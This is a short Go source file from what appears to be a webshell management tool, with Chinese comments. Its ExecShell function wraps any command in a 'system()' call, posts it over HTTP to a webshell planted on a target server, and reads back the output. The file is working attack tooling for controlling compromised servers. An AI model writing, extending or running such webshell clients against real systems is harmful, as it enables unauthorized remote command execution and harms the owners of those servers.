// Package shell shell.go
package shell

import (
	"fmt"
	"io"
	"webshellManager/http"
	"webshellManager/util"
)

func ExecShell(payload string) (*string, error) {
	shellPayload := "cmd=system('" + payload + "');" // 修改此行，修复字符串拼接问题
	respShell, err := http.MakeRequest(shellPayload)
	{
		util.HandleError(err, "请求执行系统命令失败")
	}
	defer func(body io.ReadCloser) {
		err := body.Close()
		{
			util.HandleError(err, "关闭响应失败")
		}
	}(respShell.Body)

	bodyShell, err := io.ReadAll(respShell.Body)
	{
		util.HandleError(err, "读取响应体失败")
	}
	bodyresp := string(bodyShell)
	if bodyresp != "" {
		fmt.Println("执行系统命令响应:")
		//fmt.Printf("%s", bodyShell)
	}
	return &bodyresp, nil
}
